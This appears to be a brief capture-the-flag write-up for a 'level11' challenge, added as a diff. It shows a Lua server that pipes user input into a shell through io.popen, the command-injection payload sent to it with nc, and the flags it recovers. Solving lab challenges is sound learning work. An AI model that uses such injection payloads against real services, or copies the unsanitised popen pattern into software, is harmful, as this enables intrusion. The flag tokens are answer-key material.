@@ -1,0 +1,19 @@
+## FLAG: `feulo4b72j7edeahuete3no7c`
+
+> cat level11.lua
+Server on 127.0.0.1:5151
+```
+    local server = assert(socket.bind("127.0.0.1", 5151))
+```
+```
+    prog = io.popen("echo "..pass.." | sha1sum", "r")
+```
+"echo ; getflag > /tmp/11_flag | sha1sum"
+
+> nc 127.0.0.1 5151
+    > ; getflag > /tmp/11_flag
+
+> cat /tmp/11_flag
+```
+    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+```
